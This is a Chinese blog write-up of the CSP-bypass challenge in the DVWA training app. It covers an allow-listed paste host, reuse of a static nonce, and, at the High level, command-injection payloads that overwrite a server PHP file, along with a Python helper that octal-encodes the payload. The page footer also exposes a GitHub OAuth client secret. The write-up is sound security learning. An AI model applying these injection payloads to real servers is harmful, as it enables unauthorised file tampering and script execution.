@@ -1,0 +1,344 @@
+<!doctype html><html lang=zh-cn dir=ltr>
+<head><meta charset=utf-8>
+<meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="前言 终于，DVWA快要打通关了。OWASP 2021 的 Top 10 里已经看不到 CSP 了。可能是合并到了 Injection 里，XSS也合并到 Injection 里了。一个 Injection 总结各种注入还是挺精辟的。
+直接开干吧。
+原理 CSP 是 Content Security Policy ，一种降低 XSS 攻击面的技术。简单概括下就是一种同源策略的扩展，用以约束 &amp;lt;script src=&amp;quot;...&amp;quot;、&amp;lt;img src=&amp;quot;...&amp;quot; 这样的外部来源。
+比如说，设置 Content-Security-Policy: script-src 'self' 就会约束脚本src必须和当前页面同源。
+Content-Security-Policy 支持的策略非常多，懒得一一列举了，常见的有 default-src 、script-src 这些。
+解题 Low：收集信息 看介绍，直接填一个脚本链接，脚本会被包含进这个页面。尝试启动一个 http 服务器然后填入。
+Refused to load the script 'http://172.17.0.1:8000/1.js' because it violates the following Content Security Policy directive: &amp;quot;script-src 'self' https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com&amp;quot;. Note that 'script-src-elem' was not explicitly set, so 'script-src' is used as a fallback."><title>DVWA上手记录-CSP BYPASS</title>
+<link rel=canonical href=https://nnnewb.github.io/blog/p/get-start-dvwa-12/>
+<link rel=stylesheet href=/blog/scss/style.min.b80bf249ce4a22cf55e8d7340a0b37a2f2c10f54f3a9a49cb94b694a2eb0bbea.css><meta property="og:title" content="DVWA上手记录-CSP BYPASS">
+<meta property="og:description" content="前言 终于，DVWA快要打通关了。OWASP 2021 的 Top 10 里已经看不到 CSP 了。可能是合并到了 Injection 里，XSS也合并到 Injection 里了。一个 Injection 总结各种注入还是挺精辟的。
+直接开干吧。
+原理 CSP 是 Content Security Policy ，一种降低 XSS 攻击面的技术。简单概括下就是一种同源策略的扩展，用以约束 &amp;lt;script src=&amp;quot;...&amp;quot;、&amp;lt;img src=&amp;quot;...&amp;quot; 这样的外部来源。
+比如说，设置 Content-Security-Policy: script-src 'self' 就会约束脚本src必须和当前页面同源。
+Content-Security-Policy 支持的策略非常多，懒得一一列举了，常见的有 default-src 、script-src 这些。
+解题 Low：收集信息 看介绍，直接填一个脚本链接，脚本会被包含进这个页面。尝试启动一个 http 服务器然后填入。
+Refused to load the script 'http://172.17.0.1:8000/1.js' because it violates the following Content Security Policy directive: &amp;quot;script-src 'self' https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com&amp;quot;. Note that 'script-src-elem' was not explicitly set, so 'script-src' is used as a fallback.">
+<meta property="og:url" content="https://nnnewb.github.io/blog/p/get-start-dvwa-12/">
+<meta property="og:site_name" content="weakptr's 笔记">
+<meta property="og:type" content="article"><meta property="article:section" content="Post"><meta property="article:tag" content="security"><meta property="article:tag" content="dvwa"><meta property="article:published_time" content="2022-04-29T00:00:00+08:00"><meta property="article:modified_time" content="2022-04-29T00:00:00+08:00">
+<meta name=twitter:title content="DVWA上手记录-CSP BYPASS">
+<meta name=twitter:description content="前言 终于，DVWA快要打通关了。OWASP 2021 的 Top 10 里已经看不到 CSP 了。可能是合并到了 Injection 里，XSS也合并到 Injection 里了。一个 Injection 总结各种注入还是挺精辟的。
+直接开干吧。
+原理 CSP 是 Content Security Policy ，一种降低 XSS 攻击面的技术。简单概括下就是一种同源策略的扩展，用以约束 &amp;lt;script src=&amp;quot;...&amp;quot;、&amp;lt;img src=&amp;quot;...&amp;quot; 这样的外部来源。
+比如说，设置 Content-Security-Policy: script-src 'self' 就会约束脚本src必须和当前页面同源。
+Content-Security-Policy 支持的策略非常多，懒得一一列举了，常见的有 default-src 、script-src 这些。
+解题 Low：收集信息 看介绍，直接填一个脚本链接，脚本会被包含进这个页面。尝试启动一个 http 服务器然后填入。
+Refused to load the script 'http://172.17.0.1:8000/1.js' because it violates the following Content Security Policy directive: &amp;quot;script-src 'self' https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com&amp;quot;. Note that 'script-src-elem' was not explicitly set, so 'script-src' is used as a fallback.">
+</head>
+<body class=article-page>
+<script>(function(){const a='StackColorScheme';localStorage.getItem(a)||localStorage.setItem(a,"dark")})()</script><script>(function(){const b='StackColorScheme',a=localStorage.getItem(b),c=window.matchMedia('(prefers-color-scheme: dark)').matches===!0;a=='dark'||a==='auto'&&c?document.documentElement.dataset.scheme='dark':document.documentElement.dataset.scheme='light'})()</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky">
+<button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label=切换菜单>
+<span class=hamburger-box>
+<span class=hamburger-inner></span>
+</span>
+</button>
+<header>
+<figure class=site-avatar>
+<a href=/blog>
+<img src=/blog/img/avatar_hub37949326d1692892aa1e64434c0dda6_382115_300x0_resize_box_3.png width=300 height=300 class=site-logo loading=lazy alt=Avatar>
+</a>
+<span class=emoji>🍑</span>
+</figure>
+<div class=site-meta>
+<h1 class=site-name><a href=/blog>weakptr's 笔记</a></h1>
+<h2 class=site-description>弃船！</h2>
+</div>
+</header><ol class=menu id=main-menu>
+<li>
+<a href=/blog><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>首页</span>
+</a>
+</li>
+<li>
+<a href=/blog/about><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
+<span>关于我</span>
+</a>
+</li>
+<li>
+<a href=/blog/archive><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>归档</span>
+</a>
+</li>
+<li>
+<a href=/blog/categories><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg>
+<span>分类</span>
+</a>
+</li>
+<li>
+<a href=/blog/link><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+<span>友链</span>
+</a>
+</li>
+<div class=menu-bottom-section>
+<li id=dark-mode-toggle><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span>暗色模式</span>
+</li>
+</div>
+</ol>
+</aside>
+<main class="main full-width">
+<article class=main-article>
+<header class=article-header>
+<div class=article-details>
+<header class=article-category>
+<a href=/blog/categories/security/>
+security
+</a>
+</header>
+<div class=article-title-wrapper>
+<h2 class=article-title>
+<a href=/blog/p/get-start-dvwa-12/>DVWA上手记录-CSP BYPASS</a>
+</h2>
+</div>
+<footer class=article-time>
+<div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published>2022年 4月 29日</time>
+</div>
+<div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>
+阅读时长: 2 分钟
+</time>
+</div>
+</footer>
+</div>
+</header>
+<section class=article-content>
+<h2 id=前言>前言</h2>
+<p>终于，DVWA快要打通关了。OWASP 2021 的 Top 10 里已经看不到 CSP 了。可能是合并到了 Injection 里，XSS也合并到 Injection 里了。一个 Injection 总结各种注入还是挺精辟的。</p>
+<p>直接开干吧。</p>
+<h2 id=原理>原理</h2>
+<p>CSP 是 <em>Content Security Policy</em> ，一种降低 XSS 攻击面的技术。简单概括下就是一种同源策略的扩展，用以约束 <code>&lt;script src="..."</code>、<code>&lt;img src="..."</code> 这样的外部来源。</p>
+<p>比如说，设置 <code>Content-Security-Policy: script-src 'self'</code> 就会约束脚本<code>src</code>必须和当前页面同源。</p>
+<p><code>Content-Security-Policy</code> 支持的策略非常多，懒得一一列举了，常见的有 <code>default-src</code> 、<code>script-src</code> 这些。</p>
+<h2 id=解题>解题</h2>
+<h3 id=low收集信息>Low：收集信息</h3>
+<p><img src=/blog/p/get-start-dvwa-12/image-20220429091729687.png width=675 height=294 srcset="/blog/p/get-start-dvwa-12/image-20220429091729687_hu2f3cc289af47230eaf92438df0fbafe5_27328_480x0_resize_box_3.png 480w, /blog/p/get-start-dvwa-12/image-20220429091729687_hu2f3cc289af47230eaf92438df0fbafe5_27328_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220429091729687 class=gallery-image data-flex-grow=229 data-flex-basis=551px></p>
+<p>看介绍，直接填一个脚本链接，脚本会被包含进这个页面。尝试启动一个 http 服务器然后填入。</p>
+<p><img src=/blog/p/get-start-dvwa-12/image-20220429091905350.png width=1905 height=77 srcset="/blog/p/get-start-dvwa-12/image-20220429091905350_huf724763d9e09669555078623fbf57dc1_17736_480x0_resize_box_3.png 480w, /blog/p/get-start-dvwa-12/image-20220429091905350_huf724763d9e09669555078623fbf57dc1_17736_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220429091905350 class=gallery-image data-flex-grow=2474 data-flex-basis=5937px></p>
+<pre><code>Refused to load the script 'http://172.17.0.1:8000/1.js' because it violates the following Content Security Policy directive: &quot;script-src 'self' https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com&quot;. Note that 'script-src-elem' was not explicitly set, so 'script-src' is used as a fallback.
+</code></pre><p>设置了<code>script-src</code>策略，注意到策略里允许了 <code>pastebin</code>、<code>hastebin</code>、<code>toptal</code> 这些网站。</p>
+<h3 id=low解题>Low：解题</h3>
+<p>在 <code>hastebin.com</code> 写一句 <code>alert(1)</code> ，保存并取纯文本链接，然后贴到这里。</p>
+<p><img src=/blog/p/get-start-dvwa-12/image-20220429092314962.png width=1028 height=179 srcset="/blog/p/get-start-dvwa-12/image-20220429092314962_hubd3c494cde831b92d1ca32445eee79b0_9689_480x0_resize_box_3.png 480w, /blog/p/get-start-dvwa-12/image-20220429092314962_hubd3c494cde831b92d1ca32445eee79b0_9689_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220429092314962 class=gallery-image data-flex-grow=574 data-flex-basis=1378px></p>
+<p>成功。</p>
+<h3 id=medium收集信息>Medium：收集信息</h3>
+<p><img src=/blog/p/get-start-dvwa-12/image-20220429092433248.png width=689 height=281 srcset="/blog/p/get-start-dvwa-12/image-20220429092433248_hu4909a87c56a722d6a8ba60b4ed3a10d6_26990_480x0_resize_box_3.png 480w, /blog/p/get-start-dvwa-12/image-20220429092433248_hu4909a87c56a722d6a8ba60b4ed3a10d6_26990_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220429092433248 class=gallery-image data-flex-grow=245 data-flex-basis=588px></p>
+<p>提示不管写什么都会直接丢到这里，看你能不能弹出个<code>alert</code>。</p>
+<p>尝试写一个<code>&lt;script>alert(1)&lt;/script></code>，发现出错：</p>
+<pre><code>Refused to execute inline script because it violates the following Content Security Policy directive: &quot;script-src 'self' 'unsafe-inline' 'nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA='&quot;. Note that 'unsafe-inline' is ignored if either a hash or nonce value is present in the source list.
+</code></pre><p>提示CSP禁止了inline脚本，但后面备注<code>unsafe-inline</code>会在源列表里有<code>hash</code>和<code>nonce</code>的情况下忽略。</p>
+<h3 id=medium解题>Medium：解题</h3>
+<p>尝试在 payload 上加上 <code>nonce</code>：<code>&lt;script nonce>alert(1)&lt;/script></code>，错误不变。</p>
+<p>加上 <code>src</code>，随便选一个真实存在的 js：<code>&lt;script src="/dvwa/js/dvwaPage.js" nonce>alert(1)&lt;/script></code>，错误消失。但脚本没有执行。无奈看了下帮助，提示注意 CSP 的 <code>nonce</code> 策略。于是翻了下请求历史，发现 <code>nonce</code> 不变。</p>
+<p>于是修改 payload，<code>nonce</code> 设置为固定值：<code>&lt;script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">alert(1)&lt;/script></code></p>
+<p><img src=/blog/p/get-start-dvwa-12/image-20220429093610302.png width=1004 height=183 srcset="/blog/p/get-start-dvwa-12/image-20220429093610302_hu12441bbc3f3a7c406e6400dd6e11b998_9655_480x0_resize_box_3.png 480w, /blog/p/get-start-dvwa-12/image-20220429093610302_hu12441bbc3f3a7c406e6400dd6e11b998_9655_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220429093610302 class=gallery-image data-flex-grow=548 data-flex-basis=1316px></p>
+<p>需要注意的是 <code>nonce-</code> 这个前缀不用放到 <code>script</code> 标签的 <code>nonce</code> 里。</p>
+<h3 id=high收集信息>High：收集信息</h3>
+<p><img src=/blog/p/get-start-dvwa-12/image-20220429093750904.png width=679 height=314 srcset="/blog/p/get-start-dvwa-12/image-20220429093750904_hu10d926e0d3861b784670f7dda4ca3481_29216_480x0_resize_box_3.png 480w, /blog/p/get-start-dvwa-12/image-20220429093750904_hu10d926e0d3861b784670f7dda4ca3481_29216_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220429093750904 class=gallery-image data-flex-grow=216 data-flex-basis=518px></p>
+<p>点击<code>Solve the sum</code>后：</p>
+<p><img src=/blog/p/get-start-dvwa-12/image-20220429093808724.png width=146 height=68 srcset="/blog/p/get-start-dvwa-12/image-20220429093808724_hu0b3e44bc905f71795c43342edf52ba01_2030_480x0_resize_box_3.png 480w, /blog/p/get-start-dvwa-12/image-20220429093808724_hu0b3e44bc905f71795c43342edf52ba01_2030_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220429093808724 class=gallery-image data-flex-grow=214 data-flex-basis=515px></p>
+<p>提示是修改指定的页面来运行自己的代码，怪。这要怎么做？没思路了，看一眼帮助，并没有帮助。</p>
+<p>这一次的 <code>Content-Security-Policy</code>是<code>script-src 'self'</code>，点击<code>Solve the sum</code>产生请求<code>jsonp.php?callback=solveSum</code>。返回结果是一个 js 脚本。审阅代码没有包含 <code>jsonp.php</code> 的内容。</p>
+<p>好吧。先试试请求 <code>jsonp.php</code>，改一下<code>callback</code>参数，请求<code>http://localhost:8080/vulnerabilities/csp/source/jsonp.php?alert</code>。结果返回一个空页面，没有js。所以提示还是对的，只能改<code>jsonp.php</code>文件完成High难度。</p>
+<p>改法可以很简单=。=我们先拿命令注入提取出<code>jsonp.php</code>文件，方便下载。</p>
+<pre><code>n|cp /var/www/html/vulnerabilities/csp/source/jsonp.php /var/www/html/jsonp.txt
+</code></pre><p>然后访问<code>/jsonp.txt</code>拿到内容：</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>
+<span class=nx>header</span><span class=p>(</span><span class=s2>&#34;Content-Type: application/json; charset=UTF-8&#34;</span><span class=p>);</span>
+
+<span class=k>if</span> <span class=p>(</span><span class=nx>array_key_exists</span> <span class=p>(</span><span class=s2>&#34;callback&#34;</span><span class=p>,</span> <span class=nv>$_GET</span><span class=p>))</span> <span class=p>{</span>
+	<span class=nv>$callback</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;callback&#39;</span><span class=p>];</span>
+<span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
+	<span class=k>return</span> <span class=s2>&#34;&#34;</span><span class=p>;</span>
+<span class=p>}</span>
+
+<span class=nv>$outp</span> <span class=o>=</span> <span class=k>array</span> <span class=p>(</span><span class=s2>&#34;answer&#34;</span> <span class=o>=&gt;</span> <span class=s2>&#34;15&#34;</span><span class=p>);</span>
+
+<span class=k>echo</span> <span class=nv>$callback</span> <span class=o>.</span> <span class=s2>&#34;(&#34;</span><span class=o>.</span><span class=nx>json_encode</span><span class=p>(</span><span class=nv>$outp</span><span class=p>)</span><span class=o>.</span><span class=s2>&#34;)&#34;</span><span class=p>;</span>
+<span class=cp>?&gt;</span><span class=err>
+</span></code></pre></div><p>emm，没什么特别的，接着看下前端怎么处理 <code>jsonp.php</code> 返回的内容。</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=kd>function</span> <span class=nx>clickButton</span><span class=p>()</span> <span class=p>{</span>
+    <span class=kd>var</span> <span class=nx>s</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=s2>&#34;script&#34;</span><span class=p>);</span>
+    <span class=nx>s</span><span class=p>.</span><span class=nx>src</span> <span class=o>=</span> <span class=s2>&#34;source/jsonp.php?callback=solveSum&#34;</span><span class=p>;</span>
+    <span class=nb>document</span><span class=p>.</span><span class=nx>body</span><span class=p>.</span><span class=nx>appendChild</span><span class=p>(</span><span class=nx>s</span><span class=p>);</span>
+<span class=p>}</span>
+
+<span class=kd>function</span> <span class=nx>solveSum</span><span class=p>(</span><span class=nx>obj</span><span class=p>)</span> <span class=p>{</span>
+    <span class=k>if</span> <span class=p>(</span><span class=s2>&#34;answer&#34;</span> <span class=k>in</span> <span class=nx>obj</span><span class=p>)</span> <span class=p>{</span>
+        <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s2>&#34;answer&#34;</span><span class=p>).</span><span class=nx>innerHTML</span> <span class=o>=</span> <span class=nx>obj</span><span class=p>[</span><span class=s1>&#39;answer&#39;</span><span class=p>];</span>
+    <span class=p>}</span>
+<span class=p>}</span>
+
+<span class=kd>var</span> <span class=nx>solve_button</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span> <span class=p>(</span><span class=s2>&#34;solve&#34;</span><span class=p>);</span>
+
+<span class=k>if</span> <span class=p>(</span><span class=nx>solve_button</span><span class=p>)</span> <span class=p>{</span>
+    <span class=nx>solve_button</span><span class=p>.</span><span class=nx>addEventListener</span><span class=p>(</span><span class=s2>&#34;click&#34;</span><span class=p>,</span> <span class=kd>function</span><span class=p>()</span> <span class=p>{</span>
+        <span class=nx>clickButton</span><span class=p>();</span>
+    <span class=p>});</span>
+<span class=p>}</span>
+</code></pre></div><p>重点来了：</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=kd>var</span> <span class=nx>s</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=s2>&#34;script&#34;</span><span class=p>);</span>
+<span class=nx>s</span><span class=p>.</span><span class=nx>src</span> <span class=o>=</span> <span class=s2>&#34;source/jsonp.php?callback=solveSum&#34;</span><span class=p>;</span>
+<span class=nb>document</span><span class=p>.</span><span class=nx>body</span><span class=p>.</span><span class=nx>appendChild</span><span class=p>(</span><span class=nx>s</span><span class=p>);</span>
+</code></pre></div><p>直接把 <code>jsonp.php</code> 返回的内容当成了 <code>script</code> 标签的内容，也就是在 <code>jsonp.php</code> 返回随便什么东西前端都会执行。</p>
+<p>那下一步就容易了，利用命令注入漏洞注入一个新的 php 标签，并输出 <code>alert</code>。先写一个脚本把脚本编码成<code>printf</code> 接受的8进制转义。</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=n>encoded</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
+<span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;&lt;?php echo </span><span class=se>\&#39;</span><span class=s1>alert(1)</span><span class=se>\&#39;</span><span class=s1>; ?&gt;&#39;</span>
+<span class=k>for</span> <span class=n>c</span> <span class=ow>in</span> <span class=n>payload</span><span class=p>:</span>
+    <span class=k>if</span> <span class=n>c</span> <span class=ow>in</span> <span class=s1>&#39;()&amp;|-$`;</span><span class=se>\&#39;</span><span class=s1>&#39;</span><span class=p>:</span>
+    	<span class=n>encoded</span> <span class=o>+=</span> <span class=s1>&#39;</span><span class=se>\\</span><span class=s1>0</span><span class=si>{:o}</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=nb>ord</span><span class=p>(</span><span class=n>c</span><span class=p>))</span>
+    <span class=k>else</span><span class=p>:</span>
+        <span class=n>encoded</span> <span class=o>+=</span> <span class=n>c</span>
+</code></pre></div><p>得到结果之后，变形一下payload：<code>127.0.0.1|printf '&lt;?php echo \047alert\0501\051\047\073 ?>'>>/var/www/html/jsonp.txt</code>。执行后检查：</p>
+<p><img src=/blog/p/get-start-dvwa-12/image-20220429103150056.png width=327 height=56 srcset="/blog/p/get-start-dvwa-12/image-20220429103150056_hub5c6d67aa168f3580750181df77868f2_1189_480x0_resize_box_3.png 480w, /blog/p/get-start-dvwa-12/image-20220429103150056_hub5c6d67aa168f3580750181df77868f2_1189_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220429103150056 class=gallery-image data-flex-grow=583 data-flex-basis=1401px></p>
+<p>再真正注入到 <code>jsonp.php</code> 里。<code>127.0.0.1|printf '&lt;?php echo \047alert\0501\051\047\073 ?>'>>/var/www/html/vulnerabilities/csp/source/jsonp.php</code>，返回后发现有语法错误。</p>
+<p><img src=/blog/p/get-start-dvwa-12/image-20220429103315118.png width=300 height=59 srcset="/blog/p/get-start-dvwa-12/image-20220429103315118_hu75aa511ad34f2242e8072357aa88b0e3_5600_480x0_resize_box_3.png 480w, /blog/p/get-start-dvwa-12/image-20220429103315118_hu75aa511ad34f2242e8072357aa88b0e3_5600_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220429103315118 class=gallery-image data-flex-grow=508 data-flex-basis=1220px></p>
+<p>是我大意了=。=算了，直接覆盖掉 <code>jsonp.php</code> 完事。<code>127.0.0.1|printf '&lt;?php echo \047alert\0501\051\047\073 ?>'>/var/www/html/vulnerabilities/csp/source/jsonp.php</code></p>
+<p><img src=/blog/p/get-start-dvwa-12/image-20220429103448845.png width=819 height=209 srcset="/blog/p/get-start-dvwa-12/image-20220429103448845_hu6c77229d9cdd2a99b846bd1ffe887a6d_16620_480x0_resize_box_3.png 480w, /blog/p/get-start-dvwa-12/image-20220429103448845_hu6c77229d9cdd2a99b846bd1ffe887a6d_16620_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220429103448845 class=gallery-image data-flex-grow=391 data-flex-basis=940px></p>
+<p>成功。</p>
+<h2 id=总结>总结</h2>
+<p>一定要总结的话就是确实有黑客思维这回事。题目并不是真的在考一个固定知识点，虽然是在CSP题，但真正的关键工作是在命令注入完成的，只是观察CSP这个页面的话是什么也干不成的，即使没有 CSP 干瞪着这个页面也干不成，就算有创建<code>script</code>标签设置内容的<code>js</code>也利用不到。</p>
+<p>但抱怨还是有抱怨的。因为我通关DVWA的目的是学习=。=CSP的 High 难度选择用命令注入当突破口，对了解 CSP 本身就没啥用了，命令注入本身可以干的事情就远不止弄死一个 CSP 这么点=。=</p>
+<p>总之，也行吧。多少对 CSP 有点了解了。</p>
+</section>
+<footer class=article-footer>
+<section class=article-tags>
+<a href=/blog/tags/security/>security</a>
+<a href=/blog/tags/dvwa/>dvwa</a>
+</section>
+<section class=article-copyright><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span>
+</section>
+</footer>
+<link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.css integrity=sha384-RZU/ijkSsFbcmivfdRBQDtwuwVqK7GMOw6IMvKyeWL2K5UAlyp6WonmB8m7Jd0Hn crossorigin=anonymous><script src=https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.js integrity=sha384-pK1WpvzWVBQiP0/GjnvRxV4mOb0oxFuyRxJlk6vVw146n3egcN5C925NCP7a7BY8 crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/contrib/auto-render.min.js integrity=sha384-vZTG03m+2yp6N6BNi5iM4rW4oIwk5DfcNdFfxkk9ZWpDriOkXX8voJBFrAO7MpVl crossorigin=anonymous defer></script><script>window.addEventListener("DOMContentLoaded",()=>{renderMathInElement(document.querySelector(`.article-content`),{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1},{left:"\\(",right:"\\)",display:!1},{left:"\\[",right:"\\]",display:!0}]})})</script>
+</article>
+<aside class=related-contents--wrapper>
+<h2 class=section-title>相关文章</h2>
+<div class=related-contents>
+<div class="flex article-list--tile">
+<article>
+<a href=/blog/p/get-start-dvwa-11/>
+<div class=article-details>
+<h2 class=article-title>DVWA上手记录-存储型XSS</h2>
+</div>
+</a>
+</article>
+<article>
+<a href=/blog/p/get-start-dvwa-10/>
+<div class=article-details>
+<h2 class=article-title>DVWA上手记录-反射型XSS</h2>
+</div>
+</a>
+</article>
+<article>
+<a href=/blog/p/get-start-dvwa-09/>
+<div class=article-details>
+<h2 class=article-title>DVWA上手记录-DOM型XSS</h2>
+</div>
+</a>
+</article>
+<article>
+<a href=/blog/p/get-start-dvwa-08/>
+<div class=article-details>
+<h2 class=article-title>DVWA上手记录-弱会话ID</h2>
+</div>
+</a>
+</article>
+<article>
+<a href=/blog/p/get-start-dvwa-07/>
+<div class=article-details>
+<h2 class=article-title>DVWA上手记录-SQL盲注</h2>
+</div>
+</a>
+</article>
+</div>
+</div>
+</aside>
+<link rel=stylesheet href=https://unpkg.com/vssue/dist/vssue.min.css>
+<div id=vssue></div>
+<script src=https://unpkg.com/vue@2.6.14/dist/vue.runtime.min.js></script>
+<script src=https://unpkg.com/vssue@1.4.8/dist/vssue.github.min.js></script>
+<script>new Vue({el:"#vssue",render:a=>a("Vssue",{props:{title:"DVWA上手记录-CSP BYPASS",options:{autoCreateIssue:!1,owner:"nnnewb",repo:"blog",clientId:"285910fdc1567a1a23e3",clientSecret:"f00da5438d9ac82c4a86024866c7a916ae411edc"}}})})</script>
+<footer class=site-footer>
+<section class=copyright>
+&copy;
+2021 -
+2022 weakptr's 笔记
+</section>
+<section class=powerby>
+GitHub Pages <br>
+Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> <br>
+Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.10.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a>
+</section>
+</footer>
+<div class=pswp tabindex=-1 role=dialog aria-hidden=true>
+<div class=pswp__bg></div>
+<div class=pswp__scroll-wrap>
+<div class=pswp__container>
+<div class=pswp__item></div>
+<div class=pswp__item></div>
+<div class=pswp__item></div>
+</div>
+<div class="pswp__ui pswp__ui--hidden">
+<div class=pswp__top-bar>
+<div class=pswp__counter></div>
+<button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+<div class=pswp__preloader>
+<div class=pswp__preloader__icn>
+<div class=pswp__preloader__cut>
